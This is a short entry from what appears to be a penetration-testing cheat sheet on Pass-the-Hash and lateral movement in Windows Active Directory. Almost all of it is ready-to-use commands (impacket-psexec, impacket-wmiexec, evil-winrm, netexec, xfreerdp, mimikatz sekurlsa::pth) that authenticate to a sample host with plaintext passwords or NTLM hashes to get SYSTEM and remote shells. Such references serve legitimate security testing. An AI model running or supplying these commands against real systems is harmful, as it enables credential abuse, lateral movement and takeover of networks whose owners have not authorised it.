---
description: |
  Pass-the-Hash (PtH) — authenticate using NTLM hashes instead of plaintext passwords across SMB, WinRM, and RDP. Also covers plaintext credential lateral movement (xfreerdp, smbclient, psexec).
commands:
  - have: Credentials
    cmd: |
      # xfreerdp — RDP with password and domain (+clipboard recommended)
      xfreerdp /u:sec_user /p:'P@ssw0rd' /v:10.10.10.27 /d:senshu.local +clipboard

      # impacket-psexec — SYSTEM shell via SMB
      impacket-psexec senshu.local/sec_user:'P@ssw0rd'@10.10.10.27

      # evil-winrm — WinRM shell
      evil-winrm -i 10.10.10.27 -u sec_user -p 'P@ssw0rd'

      # smbclient — browse shares
      smbclient //10.10.10.27/Users -U 'senshu.local/sec_user%P@ssw0rd'

      # nxc — run command
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' -x "whoami"
  - have: Hash
    cmd: |
      evil-winrm -i 10.10.10.27 -u sec_user -H NTHASH
      nxc smb 10.10.10.27 -u sec_user -H NTHASH -x "whoami"
      impacket-psexec senshu.local/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH
      impacket-wmiexec senshu.local/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH
      xfreerdp3 /v:10.10.10.27 /u:sec_user /pth:NTHASH /d:senshu.local +clipboard
      mimikatz.exe "sekurlsa::pth /user:sec_user /domain:senshu.local /ntlm:NTHASH"
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - SMB
  - WinRM
  - RDP
techniques:
  - Pass-the-Hash
references:
  - https://github.com/fortra/impacket
  - https://github.com/Hackplayers/evil-winrm
  - https://www.netexec.wiki/
---
